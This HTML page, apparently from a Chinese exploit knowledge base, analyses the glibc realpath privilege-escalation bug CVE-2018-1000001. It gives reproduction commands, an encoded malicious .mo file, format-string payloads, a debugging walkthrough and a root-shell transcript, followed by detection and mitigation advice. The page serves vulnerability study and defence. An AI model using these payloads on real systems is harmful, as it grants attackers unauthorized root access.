<!DOCTYPE html>
<!--[if IE 8]><html class="no-js lt-ie9" lang="en" > <![endif]-->
<!--[if gt IE 8]><!--> <html class="no-js" lang="en" > <!--<![endif]-->
<head>
  <meta charset="utf-8">
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  
  
  <link rel="shortcut icon" href="../img/favicon.ico">
  <title>Cve 2018 1000001 - expwiki</title>
  <link href='https://fonts.googleapis.com/css?family=Lato:400,700|Roboto+Slab:400,700|Inconsolata:400,700' rel='stylesheet' type='text/css'>

  <link rel="stylesheet" href="../css/theme.css" type="text/css" />
  <link rel="stylesheet" href="../css/theme_extra.css" type="text/css" />
  <link rel="stylesheet" href="../css/highlight.css">
  
  <script>
    // Current page data
    var mkdocs_page_name = "Cve 2018 1000001";
    var mkdocs_page_input_path = "cve-2018-1000001.md";
    var mkdocs_page_url = "/cve-2018-1000001/";
  </script>
  
  <script src="../js/jquery-2.1.1.min.js"></script>
  <script src="../js/modernizr-2.8.3.min.js"></script>
  <script type="text/javascript" src="../js/highlight.pack.js"></script> 
  
</head>

<body class="wy-body-for-nav" role="document">

  <div class="wy-grid-for-nav">

    
    <nav data-toggle="wy-nav-shift" class="wy-nav-side stickynav">
      <div class="wy-side-nav-search">
        <a href=".." class="icon icon-home"> expwiki</a>
        <div role="search">
  <form id ="rtd-search-form" class="wy-form" action="../search.html" method="get">
    <input type="text" name="q" placeholder="Search docs" />
  </form>
</div>
      </div>

      <div class="wy-menu wy-menu-vertical" data-spy="affix" role="navigation" aria-label="main navigation">
	<ul class="current">
	  
          
            <li class="toctree-l1">
		
    <a class="" href="..">Home</a>
	    </li>
          
            <li class="toctree-l1">
		
    <a class="" href="../acknowledgements/">Acknowledgements</a>
	    </li>
          
            <li class="toctree-l1">
		
    <a class="" href="../cve-2018-1000001-01/">Cve 2018 1000001 01</a>
	    </li>
          
            <li class="toctree-l1 current">
		
    <a class="current" href="./">Cve 2018 1000001</a>
    <ul class="subnav">
            
    <li class="toctree-l2"><a href="#cve-2018-1000001">cve-2018-1000001</a></li>
    
        <ul>
        
            <li><a class="toctree-l3" href="#0">0.作者</a></li>
        
            <li><a class="toctree-l3" href="#1">1.背景介绍</a></li>
        
            <li><a class="toctree-l3" href="#2">2.漏洞分析</a></li>
        
            <li><a class="toctree-l3" href="#3poc">3.POC</a></li>
        
        </ul>
    

    <li class="toctree-l2"><a href="#1_1">1. 去上面👆给出的地址处下载镜像</a></li>
    

    <li class="toctree-l2"><a href="#2_1">2. 创建虚拟机硬盘</a></li>
    

    <li class="toctree-l2"><a href="#3-enable-kvm">3. 安装虚拟机(有条件可以增加-enable-kvm选项)</a></li>
    

    <li class="toctree-l2"><a href="#_1">判断方法：</a></li>
    

    <li class="toctree-l2"><a href="#grep-e-vmxsvm-proccpuinfo">grep -E 'vmx|svm' /proc/cpuinfo</a></li>
    

    <li class="toctree-l2"><a href="#lsmod-grep-kvm">lsmod | grep kvm</a></li>
    

    <li class="toctree-l2"><a href="#4">4. 启动虚拟机</a></li>
    

    <li class="toctree-l2"><a href="#5-gcc">5. 启动后安装GCC</a></li>
    
        <ul>
        
            <li><a class="toctree-l3" href="#4exp">4.EXP</a></li>
        
            <li><a class="toctree-l3" href="#5">5.防护建议</a></li>
        
            <li><a class="toctree-l3" href="#6">6.参考</a></li>
        
        </ul>
    

    </ul>
	    </li>
          
            <li class="toctree-l1">
		
    <a class="" href="../cve-2019-12735-01/">Cve 2019 12735 01</a>
	    </li>
          
            <li class="toctree-l1">
		
    <a class="" href="../cve-2019-12735/">Cve 2019 12735</a>
	    </li>
          
            <li class="toctree-l1">
		
    <a class="" href="../lynis分析/">Lynis分析</a>
	    </li>
          
            <li class="toctree-l1">
		
    <a class="" href="../vuls分析/">Vuls分析</a>
	    </li>
          
            <li class="toctree-l1">
		
    <a class="" href="../wazuh分析/">Wazuh分析</a>
	    </li>
          
            <li class="toctree-l1">
		
    <a class="" href="../wazuh性能分析/">Wazuh性能分析</a>
	    </li>
          
            <li class="toctree-l1">
		
    <a class="" href="../漏洞利用知识库模版/">漏洞利用知识库模版</a>
	    </li>
          
        </ul>
      </div>
      &nbsp;
    </nav>

    <section data-toggle="wy-nav-shift" class="wy-nav-content-wrap">

      
      <nav class="wy-nav-top" role="navigation" aria-label="top navigation">
        <i data-toggle="wy-nav-top" class="fa fa-bars"></i>
        <a href="..">expwiki</a>
      </nav>

      
      <div class="wy-nav-content">
        <div class="rst-content">
          <div role="navigation" aria-label="breadcrumbs navigation">
  <ul class="wy-breadcrumbs">
    <li><a href="..">Docs</a> &raquo;</li>
    
      
    
    <li>Cve 2018 1000001</li>
    <li class="wy-breadcrumbs-aside">
      
    </li>
  </ul>
  <hr/>
</div>
          <div role="main">
            <div class="section">
              
                <h1 id="cve-2018-1000001">cve-2018-1000001</h1>
<h3 id="0">0.作者</h3>
<p>invincible1944@gmail.com</p>
<h3 id="1">1.背景介绍</h3>
<ul>
<li>漏洞相关软件</li>
</ul>
<p>glibc &lt;= 2.26</p>
<ul>
<li>
<p>GLibc简介</p>
</li>
<li>
<p>GNU/Linux systems等使用Linux内核系统的核心C代码库</p>
</li>
<li>
<p>这些代码库提供严格遵循ISO C11, POSIX.1-2008, BSD等标准的API</p>
</li>
<li>
<p>这些API包含 open, read, write, malloc, printf等基本函数</p>
</li>
<li>
<p><a href="https://www.gnu.org/software/libc/libc.html">参考一(GLIBC 官网)</a>, <a href="http://man7.org/linux/man-pages/man7/libc.7.html">参考二(Linux manual)</a></p>
</li>
<li>
<p>漏洞危害</p>
</li>
</ul>
<p>对未安装补丁的Linux系统进行本地提权。</p>
<p><a href="https://nvd.nist.gov/vuln/detail/CVE-2018-1000001">Known Affected Software Configurations</a></p>
<ul>
<li>其他对了解漏洞有利的背景知识</li>
</ul>
<p><a href="http://man7.org/linux/man-pages/man7/namespaces.7.html">namespaces</a>  </p>
<p><a href="http://man7.org/linux/man-pages/man7/user_namespaces.7.html">user_namespaces</a> </p>
<p><a href="http://man7.org/linux/man-pages/man7/mount_namespaces.7.html">mount_namespaces</a></p>
<p><a href="http://man7.org/linux/man-pages/man3/setlocale.3.html">setlocale - set the current locale</a></p>
<p><a href="https://zh.wikipedia.org/wiki/Gettext">Gettext</a></p>
<p><a href="https://zh.wikipedia.org/wiki/格式化字符串">格式化字符串</a></p>
<h3 id="2">2.漏洞分析</h3>
<ul>
<li>漏洞原理</li>
</ul>
<p>缓冲区边界判断不严格造成越界写。</p>
<ul>
<li>漏洞所属软件链接，版本，模块，目录，文件，代码行</li>
</ul>
<p>漏洞软件版本：glibc &lt;= 2.26</p>
<p>漏洞代码位置：<code>glibc-2.26/stdlib/canonicalize.c -&gt; __realpath( line 122, 199 )</code></p>
<p><a href="https://www.gnu.org/software/libc/libc.html">GLibc 官网</a><a href="http://ftp.gnu.org/gnu/glibc/">GLibc 源码库</a></p>
<ul>
<li>漏洞所属类型</li>
</ul>
<p><a href="https://cwe.mitre.org/data/definitions/787.html">CWE-787: Out-of-bounds Write</a></p>
<ul>
<li>漏洞补丁</li>
</ul>
<p><a href="https://sourceware.org/git/gitweb.cgi?p=glibc.git;h=fabef2edbc29424a8048bdd60eba1a201f95682b">glibc upstream</a></p>
<ul>
<li>漏洞CVE号</li>
</ul>
<p><a href="https://nvd.nist.gov/vuln/detail/CVE-2018-1000001">CVE-2018-1000001 </a></p>
<h3 id="3poc">3.POC</h3>
<h4 id="apoc">a.POC原理</h4>
<ul>
<li>
<p>构造特殊的namespace进程(下文称ns_proc)，并在进程的工作目录下构建特殊的目录结构，包含特制的符号链接，和特制的NLS文件</p>
</li>
<li>
<p>使umount在ns_proc进程的工作目录下运行，卸载特制的符号链接触发越界写，覆盖setloacle需要加载的正常文件路径，迫使其使用相对路径加载特制的 NLS文件</p>
</li>
<li>
<p>特制NLS文件能够控制umount的error信息的格式，可以利用%n获取写入栈内存的能力，而刚好能够修改umount libmnt_context结构体的restricted标志位，使umount认为调用者为root权限，进而允许后续的umout / 操作，从而实现DOS</p>
</li>
</ul>
<h4 id="bpoc">b.POC源码</h4>
<p>见附件: cve-2018-1000001-01.md</p>
<h4 id="c">c.复现步骤</h4>
<ul>
<li>
<p>复现环境</p>
</li>
<li>
<p>环境信息</p>
<ul>
<li>系统版本: Linux debian 4.9.0-12-amd64 #1 SMP Debian 4.9.210-1 (2020-01-20) x86_64 GNU/Linux</li>
<li>发行版名称: Debian GNU/Linux 9 (stretch)</li>
<li>glibc版本:  Debian GLIBC 2.24-11+deb9u4</li>
<li>gcc版本:  gcc (Debian 6.3.0-18+deb9u1) 6.3.0 20170516</li>
<li>umount版本: umount from util-linux 2.29.2 </li>
<li>镜像下载地址：<a href="https://cdimage.debian.org/mirror/cdimage/archive/9.12.0/amd64/iso-dvd/debian-9.12.0-amd64-DVD-1.iso">debian-9.12.0-amd64-DVD-1.iso</a></li>
<li>虚拟机软件：VMwareFusion 专业版 11.5.1 (15018442)</li>
<li>虚拟机软件：QEMU emulator version 4.2.0</li>
</ul>
</li>
<li>
<p>QEMU虚拟机搭建步骤</p>
<p>```shell</p>
<h1 id="1_1">1. 去上面👆给出的地址处下载镜像</h1>
<h1 id="2_1">2. 创建虚拟机硬盘</h1>
<p>$ qemu-img create -f qcow2 debian9.img 10G</p>
<h1 id="3-enable-kvm">3. 安装虚拟机(有条件可以增加-enable-kvm选项)</h1>
<h1 id="_1">判断方法：</h1>
<h1 id="grep-e-vmxsvm-proccpuinfo">grep -E 'vmx|svm' /proc/cpuinfo</h1>
<h1 id="lsmod-grep-kvm">lsmod | grep kvm</h1>
<p>$ qemu-system-x86_64  -m 2048 -hda debian9.img  -cdrom ./debian-9.12.0-amd64-DVD-1.iso</p>
<h1 id="4">4. 启动虚拟机</h1>
<p>$ qemu-system-x86_64 -m 2048  debian9.img</p>
<h1 id="5-gcc">5. 启动后安装GCC</h1>
<p>$ su
$ apt install gcc</p>
<p>```</p>
<ul>
<li>步骤一 设置unprivileged_userns_clone权限</li>
</ul>
<p><code>shell
 # 将unprivileged_userns_clone设置为1(默认为0)
 root$ echo 1 &gt; /proc/sys/kernel/unprivileged_userns_clone</code></p>
<ul>
<li>
<p>步骤二 创建具有独立 user/mount namespace的进程(下文称us_proc)</p>
</li>
<li>
<p>其他进程进入us_proc进程的"/proc/[us_proc pid]/cwd"目录后，用realpath(getcwd)获取的相对目录均包含"(unreachable)/tmp/"前缀</p>
</li>
</ul>
<p>```shell
  /usr/bin/unshare -m -U --map-root-user /bin/bash
  mount -t tmpfs tmpfs /tmp
  cd /tmp
  chmod 00755 .</p>
<p># Terminal 1
  debian@debian:~/Desktop/work$ /usr/bin/unshare -m -U --map-root-user /bin/bash
  root@debian:~/Desktop/work# mount -t tmpfs tmpfs /tmp
  root@debian:~/Desktop/work# cd /tmp
  root@debian:/tmp# chmod 00755 .
  root@debian:/tmp# echo $$
  52426
  root@debian:/tmp# </p>
<p># 效果如下
  # Terminal 2
  $ cd /proc/52426/cwd
  debian@debian:/proc/52426/cwd$ 
  debian@debian:/proc/52426/cwd$ realpath .
  (unreachable)/tmp
  debian@debian:/proc/52426/cwd$ realpath ../x
  (unreachable)/x
  debian@debian:/proc/52426/cwd</p>
<p>```</p>
<ul>
<li>
<p>步骤三 创建漏洞利用需要的目录和文件</p>
</li>
<li>
<p><code>__gconv_find_shlib/C/LC_MESSAGES</code>目录是setloacale寻找mo文件的相对路径
    特别注意的一点：<code>__gconv_find_shlib</code> 在不同系统上不一样，在漏洞作者的exp中还给出了两个目录(<code>from_archive, _nl_load_locale_from_archive</code>) </p>
</li>
<li>"(unreachable)/x" 是realpath解析符号链接的返回值对应的目录</li>
<li>util-linux.mo文件用于保存特制的libc依赖的.mo翻译文件</li>
<li>符号链接用于触发越界写漏洞</li>
<li>util-linux.mo保存了触发DOS的特制格式化字符串"AA%6$lnlnAAAAAAAAAA"</li>
</ul>
<p>```shell
  mkdir -p -- "(unreachable)/tmp" "(unreachable)/tmp/<strong>gconv_find_shlib/C/LC_MESSAGES" "(unreachable)/x"
  ln -s ../x/../../AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA/AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA/A "(unreachable)/tmp/down"
  base64 -d &lt;<B64-EOF | bzip2 -cd > "(unreachable)/tmp/</strong>gconv_find_shlib/C/LC_MESSAGES/util-linux.mo"
  QlpoOTFBWSZTWTOfm9IAAGX/pn6UlARGB+FeKyZnAD/n3mACAAAgAAEgAJSIqfkpspk0eUGJ6gAG
  mQeoaD1PJAamlPJGCNMTIaNGmnqMQ0AAzSwpEWpQICVUw+490ohZBgZ+s4EBAZCn/TavSQshtCiv
  iG6HOehyAp4FPt3zkpdTxNchTYITLBkXUjsgpN2QDBNX8qmbpkVgfLXKcQc1ZhVF0FxUQOtnbGlL
  5NhRmORwmQF1Dw3Yu1mds6tGAmnLwWwc2KRKGl5hcLuSKcKEgZz83pA=
  B64-EOF</p>
<p>root@debian:/tmp# tree
  .
  └── (unreachable)
      ├── tmp
      │   ├── down -&gt; ../x/../../AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA/AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA/A
      │   └── __gconv_find_shlib
      │       └── C
      │           └── LC_MESSAGES
      │               └── util-linux.mo
      └── x</p>
<p>root@debian:/tmp# strings "(unreachable)/tmp/__gconv_find_shlib/C/LC_MESSAGES/util-linux.mo"
  %s: not mounted
  Language: en
  MIME-Version: 1.0
  Content-Type: text/plain; charset=UTF-8
  Content-Transfer-Encoding: 8bit
  AA%6$lnlnAAAAAAAAAA</p>
<p>```</p>
<ul>
<li>
<p>步骤四 通过umount触发DOS</p>
</li>
<li>
<p>LC_ALL环境变量会使setlocale函数去加载翻译文件</p>
</li>
<li>
<p>umount会先尝试卸载down目录，这个特制的符号链接会触发realpath漏洞造成越界写，将堆内存中的<code>"/usr/lib/locale/C.utf8/LC_CTYPE"</code>路径字符串中LC_CTYPE覆盖为AAAAAA(略...)/A</p>
</li>
<li>
<p>当realpath将down解析为(unreachable)/x后，umount会调用warnx函数打印警告信息，此时会加载特制的util-linux.mo文件，<code>"AA%6$lnlnAAAAAAAAAA"</code>替换掉warnx函数的第一个参数<code>"%s: not mounted"</code></p>
</li>
<li>
<p>利用格式化字符串，umount栈中RSP存放的地址处的指针指向的<code>long int值(*(long *)$RSP)</code>会被修改为2。这会将该处存放的libmnt_context结构体的restricted字段修改为0, 从而让umount认为调用者是root用户，并成功进行后面的umount / 操作。</p>
<p>这个步骤相关的umount调用栈:</p>
<p><code>main-&gt;umount_one-&gt;make_exit_code-&gt;warnx(_("%s: not mounted"), tgt);</code></p>
<p>( <a href="https://zh.wikipedia.org/wiki/格式化字符串">格式化字符串</a> , <a href="https://shimo.im/docs/g6CxTdpcQ8wcHkKc/">x64传参顺序</a> )</p>
</li>
</ul>
<p><code>shell
  test$ cd /proc/2299/cwd
  test$ LC_ALL=C.UTF-8 /bin/umount --lazy down /
  AAlnAAAAAAAAAA</code></p>
</li>
</ul>
<h3 id="4exp">4.EXP</h3>
<h4 id="aexp">a.EXP原理</h4>
<p><strong>准备阶段(prepareNamespacedProcess)</strong></p>
<ul>
<li>先通过clone启动一个拥有独立user/mount namespace的子进程
  子进程启动后，会先等待父进程将其uid和gid设置为0(当前namespace)
  然后mount tmpfs到/tmp目录，并切换到/tmp作为当前工作目录
  创建一个ready文件(O_WRONLY|O_CREAT|O_EXCL|O_NOFOLLOW|O_NOCTTY)</li>
<li>
<p>获取当前系统信息</p>
</li>
<li>
<p>在clone出的子进程工作目录(/proc/[pid]/cwd)中生成一系列文件和目录</p>
</li>
</ul>
<p>生成的文件如下：</p>
<pre><code class="shell">invincible@ubuntu:/proc/10013/cwd$ tree
.
├── DATEMSK
├── ready
└── (unreachable)
    ├── tmp
    │   ├── down -&gt; ../x/../../AAA(省略...)A/AAA(省略...)A/A
    │   └── from_archive
    │       ├── C.UTF-8
    │       │   └── LC_MESSAGES
    │       │       └── util-linux.mo
    │       ├── X.x
    │       │   └── LC_MESSAGES
    │       └── X.X
    │           └── LC_MESSAGES
    │               └── util-linux.mo
    └── x


10 directories, 5 files 
invincible@ubuntu:/proc/10013/cwd$ cat DATEMSK 
#!/home/invincible/Desktop/test/exp
unused
invincible@ubuntu:/proc/10013/cwd$ file DATEMSK 
DATEMSK: a /home/invincible/Desktop/test/exp script, ASCII text executable

invincible@ubuntu:/proc/10013/cwd$ 
invincible@ubuntu:/proc/10013/cwd$ file ready 
ready: empty


invincible@ubuntu:/proc/10013/cwd$ file \(unreachable\)/tmp/from_archive/C.UTF-8/LC_MESSAGES/util-linux.mo 
(省略...)/util-linux.mo: GNU message catalog (little endian), revision 0.0, 4 messages


invincible@ubuntu:/proc/10013/cwd$ file \(unreachable\)/tmp/from_archive/X.X/LC_MESSAGES/util-linux.mo 
(省略...)/util-linux.mo: fifo (named pipe)

</code></pre>

<p>构造的DATEMSK文件内容为/proc/self/exe符号链接指向的文件:</p>
<pre><code class="shell">invincible@ubuntu:/proc/10013/cwd$ cat DATEMSK 
#!/home/invincible/Desktop/test/exp
unused
invincible@ubuntu:/proc/10013/cwd$ file DATEMSK 
DATEMSK: a /home/invincible/Desktop/test/exp script, ASCII text executabl

</code></pre>

<p>构造特制的util-linux.mo文件内容:</p>
<pre><code class="shell">invincible@ubuntu:~/Desktop/test$ msgunfmt util-linux.mo -o util-linux.po
invincible@ubuntu:~/Desktop/test$ cat util-linux.po 
msgid &quot;&quot;
msgstr &quot;&quot;
&quot;Language: en\n&quot;
&quot;MIME-Version: 1.0\n&quot;
&quot;Content-Type: text/plain; charset=UTF-8\n&quot;
&quot;Content-Transfer-Encoding: 8bit\n&quot;


msgid &quot;%s: mountpoint not found&quot;
msgstr &quot;1234&quot;


msgid &quot;%s: not mounted&quot;
msgstr &quot;&quot;
&quot;AA%6$lnAAAAAA%016lx%016lx%016lx%016lx%016lx%016lx%016lx%016lx%016lx%016lx&quot;
(省略... 共256个%16lx)
&quot;%016lx%016lx%016lx%016lx%016lx%016lx%016lx%016lx%016lx%016lx%016lx%016lx&quot;
&quot;%016lx%016lx%016lx%016lx%016lx%016lx%016lx%016lx%016lx%016lx%1$68hhx%256$hhn&quot;


msgid &quot;&quot;
&quot;%s: target is busy\n&quot;
&quot;        (In some cases useful info about processes that\n&quot;
&quot;         use the device is found by lsof(8) or fuser(1).)&quot;
msgstr &quot;5678&quot;
invincible@ubuntu:~/Desktop/test$ 

</code></pre>

<p><strong>提权阶段(attemptEscalation)</strong></p>
<ul>
<li>
<p>准备工作</p>
</li>
<li>
<p>创建用于和子进程通信的pipe用于读取子进程stdout和stderr</p>
</li>
<li>
<p>fork出子进程(下文称umout进程)，在子进程中设置pipe，切换到us_proc进程的工作目录，execve执行umount，具体执行命令：</p>
<p>```shell
AANGUAGE=X.X AANGUAGE=X.X (省略...共255次) LC_ALL=C.UTF-8 /bin/umount  /run /run /run /run /run /run /run /run /run /run down LABEL=78 LABEL=789 LABEL=789a LABEL=789ab LABEL=789abc LABEL=789abcd LABEL=789abcde LABEL=789abcdef LABEL=789abcdef0 LABEL=789abcdef0</p>
<p>```</p>
</li>
<li>
<p>开始提权</p>
</li>
<li>
<p>第0步，父进程开始持续读取umount进程的输出，等待"AAAAAAAA"字符串的出现</p>
</li>
<li>第1步，读取完整的栈内存数据，并开始解析，构造第二阶段的util-linx.mo文件内容并写入</li>
<li>第2步，持续等待，直到在超时时间内，第二阶段util-linux.mo文件内容被umount读取</li>
<li>第3步，读取剩下的umount输出防止其被阻塞</li>
<li>umount启动后，解析符号链接down会触发越界写，使堆内存中存放的正常文件路径失效，迫使其加载位于相对目录C.UTF-8/LC_MESSAGES/中特制的util-linux.mo文件，其中的 poisonous format string 会将栈内存dump到stderr，同时还会通过指向环境变量的指针，将"AANGUAGE=X.X"修改为"LANGUAGE=X.X"</li>
<li>umount继续执行，由于环境变量被修改，这将使umount读取第二阶段的util-linux.mo文件(位于X.X/LC_MESSAGES目录下，由于该文件为fifo named pipe，所以这里umoun会阻塞等待其被写入数据)</li>
<li>
<p>umount进程在父进程第1步完成后恢复执行，读取第二阶段mo文件，其中的格式化字符串将会修改umount的返回地址，通过setdate+execl实现ROP，最终执行DATEMSK文件中的exp进程，利用umount提升exp可执行文件的权限后执行，生成root shell完成提权</p>
</li>
<li>
<p>dump栈内存，修改restricted字段，修改AANGUAGE环境变量使用的格式化字符串</p>
</li>
</ul>
<p><code>shell
  "AA%6$lnAAAAAA%016lx(省略... 共256个%016lx)%016lx%1$68hhx%256$hhn"</code></p>
<ul>
<li>修改返回地址使用的格式化字符串</li>
</ul>
<p>```shell
  debian@debian:~/Desktop/work$ msgunfmt "/proc/1609/cwd/(unreachable)/tmp/__gconv_find_shlib/X.x/LC_MESSAGES/util-linux.mo" -o util-linux.po
  debian@debian:~/Desktop/work$ cat util-linux.po 
  msgid ""
  msgstr ""
  "Language: en\n"
  "MIME-Version: 1.0\n"
  "Content-Type: text/plain; charset=UTF-8\n"
  "Content-Transfer-Encoding: 8bit\n"</p>
<p>msgid "%s: mountpoint not found"
  msgstr ""
  "%67$hn%71$hn%1$18640.18640s%68$hn%1$13200.13200s%64$hn%1$906.906s%66$hn%70$hn"
  "%1$1567.1567s%65$hn%1$1.1s%69$hn%1$31222.31222s%1$5414.5414s%1$s%1$s%63$hn"
  "%1$s%1$s%1$s%1$s%1$s%1$s%1$186.186s%37$hn-%35$lx-%37$lx-%62$lx-%63$lx-%64$lx-"
  "%65$lx-%66$lx-%67$lx-%68$lx-%69$lx-%78$s\n"</p>
<p>msgid "%s: not mounted"
  msgstr "BBBB5678%3$s\n"</p>
<p>msgid ""
  "%s: target is busy\n"
  "        (In some cases useful info about processes that\n"
  "         use the device is found by lsof(8) or fuser(1).)"
  msgstr "BBBBABCD%s\n"</p>
<p>```</p>
<h4 id="bexp">b.EXP源码</h4>
<p>​   复现环境exp: 见附件cve-2018-1000001-01.md</p>
<p>​   原作者exp: <a href="https://www.halfdog.net/Security/2017/LibcRealpathBufferUnderflow/RationalLove.c">exp.c</a></p>
<h4 id="c_1">c.复现步骤</h4>
<ul>
<li>
<p>搭建复现环境，与POC中的环境相同</p>
</li>
<li>
<p>步骤一 设置unprivileged_userns_clone权限</p>
</li>
</ul>
<p><code>shell
   # 将unprivileged_userns_clone设置为1(默认为0)
   root$ echo 1 &gt; /proc/sys/kernel/unprivileged_userns_clone</code></p>
<ul>
<li>步骤二  编译exp文件</li>
</ul>
<p>使用的是修改过的exp，具体修改了加载mo的目录和execl的相对偏移以适配复现环境</p>
<p><code>shell
  gcc exp.c -o exp</code></p>
<ul>
<li>步骤三 执行exp</li>
</ul>
<p>```shell
  debian@debian:~/Desktop/work$ id
  uid=1000(debian) gid=1000(debian) groups=1000(debian),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),108(netdev),112(bluetooth),113(lpadmin),118(scanner)
  debian@debian:~/Desktop/work$ ./exp
  ./exp: invoked as SUID, invoking shell ...
  root@debian:~/Desktop/work# id
  uid=0(root) gid=0(root) groups=0(root),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),108(netdev),112(bluetooth),113(lpadmin),118(scanner),1000(debian)
  root@debian:~/Desktop/work# </p>
<p>```</p>
<ul>
<li>如何获取util-linx.mo文件的相对路径</li>
</ul>
<p>```shell
  # 定位到_nl_find_msg调用，找到第一个参数的值
  char <em>_nl_find_msg (struct loaded_l10nfile </em>domain_file,
            struct binding <em>domainbinding, const char </em>msgid,
            int convert, size_t *lengthp)
       internal_function;</p>
<p># Terminal 1
  /usr/bin/unshare -m -U --map-root-user /bin/bash
  mount -t tmpfs tmpfs /tmp
  cd /tmp
  chmod 00755 .
  mkdir -p -- "(unreachable)/tmp" "(unreachable)/tmp/xxx/C.UTF-8.utf8/LC_MESSAGES" "(unreachable)/x" 
  ln -s ../x/../../AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA/AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA/A "(unreachable)/tmp/down"
  echo $$
  46416</p>
<p># Terminal 2
  cd /proc/46416/cwd
  gdb
  file /bin/umount
  set args --lazy down 
  set env LC_ALL=C.UTF-8
  b main
  r
  b <em>umount_one if </em>(char <em>)$rsi == '('
  c
  b mk_exit_code
  c
  b </em>__dcigettext+1265
  c</p>
<p># 通过调用信息找到第一个参数
  "(unreachable)/tmp/<strong>gconv_find_shlib/C.UTF-8/LC_MESSAGES/util-linux.mo"
  # 因此相对路径应改为：</strong>gconv_find_shlib(原exp中是from_archive)
  [---------------------------------registers-------------------------
  ...
  RCX: 0x1 
  RDX: 0x55698c49ee78 ("%s: not mounted")
  RSI: 0x55698e233200 ("AAAAAA/A")
  RDI: 0x55698e23be90 --&gt; 0x55698e23c3b0 ("(unreachable)/tmp/<strong>gconv_find_shlib/C.UTF-8/LC_MESSAGES/util-linux.mo")
  ...
  R8 : 0x7fff5515b1b8 --&gt; 0x7fb5d5b84000 --&gt; 0x7fb5d572e000 --&gt; 0x10102464c457f 
  ...
  [-------------------------------------code-------------------------
  ...
  =&gt; 0x7fb5d4d69d21 &lt;</strong>dcigettext+1265&gt;:    call   0x7fb5d4d68bc0 &lt;_nl_find_msg&gt;
   ...
  Guessed arguments:
  arg[0]: 0x55698e23be90 --&gt; 0x55698e23c3b0 ("(unreachable)/tmp/__gconv_find_shlib/C.UTF-8/LC_MESSAGES/util-linux.mo")
  arg[1]: 0x55698e233200 ("AAAAAA/A")
  arg[2]: 0x55698c49ee78 ("%s: not mounted")
  arg[3]: 0x1 
  arg[4]: 0x7fff5515b1b8 --&gt; 0x7fb5d5b84000 --&gt; 0x7fb5d572e000 --&gt; 0x10102464c457f </p>
<p>Breakpoint 4, 0x00007fb5d4d69d21 in __dcigettext (
  ...
  gdb-peda$ </p>
<p># 调用栈如下
  gdb-peda$ bt
  #0  0x00007fb5d4d69d21 in <strong>dcigettext (
      domainname=0x55698e233580 "util-linux", 
      msgid1=0x55698c49ee78 "%s: not mounted", 
      msgid2=0x0, plural=0x0, n=0x0, 
      category=0x5) at dcigettext.c:742
  #1  0x000055698c49d68d in mk_exit_code (cxt=0x55698e2335a0, rc=0xffffffff)
      at sys-utils/umount.c:206
  #2  0x000055698c49dba1 in umount_one (cxt=0x55698e2335a0, spec=...
  #3  0x000055698c49d152 in main (argc=0x0, argc@entry=0x3, ...
  #4  0x00007fb5d4d5c2e1 in </strong>libc_start_main (main=0x55698c49c970 ...
  #5  0x000055698c49d3aa in _start ()</p>
<p>```</p>
<ul>
<li>如何在umount中dump栈内存的位置下断点</li>
</ul>
<p>```shell
  gcc my_exp.c -o exp4dbg -g
  gdb
  file exp4dbg
  b main
  r
  set follow-fork-mode parent
  b attemptEscalation
  c
  set follow-fork-mode child
  c
  b <em>umount_one if </em>(char <em>)$rsi == '('
  c
  b mk_exit_code
  c
  b </em>mk_exit_code+165
  c</p>
<p>=&gt; 0x561465315695 <mk_exit_code+165>: call   0x561465314560 <a href="&#109;&#97;&#105;&#108;&#116;&#111;&#58;&#119;&#97;&#114;&#110;&#120;&#64;&#112;&#108;&#116;">&#119;&#97;&#114;&#110;&#120;&#64;&#112;&#108;&#116;</a></p>
<p>gdb-peda$ bt
  #0  0x0000561465315695 in mk_exit_code (cxt=0x5614658005a0, ...
  #1  0x0000561465315ba1 in umount_one (cxt=0x5614658005a0, spec=...
  #2  0x0000561465315152 in main (argc=0xa, argc@entry=0x16, 
  ...
  #3  0x00007f29943012e1 in __libc_start_main (main=0x561465314970 ...
  #4  0x00005614653153aa in _start ()
  gdb-peda$ </p>
<p>```</p>
<h4 id="d">d.利用核心要素</h4>
<ul>
<li>
<p>利用越界写漏洞，控制gettext函数加载特制的NLS文件，控制格式化字符串</p>
</li>
<li>
<p>格式化字符串dump栈内存根据栈内相对偏移获取libc基地址绕过ASLR</p>
</li>
<li>
<p>格式化字符串修改栈内存函数参数和返回地址进而控制程序执行流程</p>
</li>
<li>
<p>通过setdate这样的简单函数为execl构造合适的栈环境实现ROP</p>
</li>
<li>
<p>通过控制suid进程umount的执行流程来创建root shell实现提权</p>
</li>
</ul>
<h3 id="5">5.防护建议</h3>
<ul>
<li>检查系统是否存在风险，及时更新系统，安装补丁。检测方式如下：</li>
</ul>
<p>```shell
  # 方式一：
  # Terminal 1
  $ sudo echo 1 &gt; /proc/sys/kernel/unprivileged_userns_clone
  $ /usr/bin/unshare -m -U --map-root-user /bin/bash
  $ mount -t tmpfs tmpfs /tmp
  $ cd /tmp
  $ echo $$
  2607</p>
<p># Terminal 2
  $ cd /proc/2607/cwd
  $ realpath .
  (unreachable)/tmp
  # 如果返回值包含(unreachable)字符串则可以判断存在风险</p>
<p># 方式二：
  # 查看glibc的package更新日志是否存在CVE-2018-1000001的补丁
  # 以安装了补丁的ubuntu16为例：
  $ PAGER=cat apt-get -q=2 changelog libc6
  ...
    * SECURITY UPDATE: Buffer underflow in realpath()
      - debian/patches/any/cvs-make-getcwd-fail-if-path-is-no-absolute.diff:
        Make getcwd(3) fail if it cannot obtain an absolute path
      - CVE-2018-1000001
  ...</p>
<p>```</p>
<ul>
<li>
<p>根据分析，该漏洞利用需要开启unprivileged_userns_clone权限，所以在紧急情况下，最快速，方便的防护方式是检查该配置，并确保其在不需要的情况下关闭以阻断漏洞利用的基础(但是此配置是某些容器应用的基础)。</p>
</li>
<li>
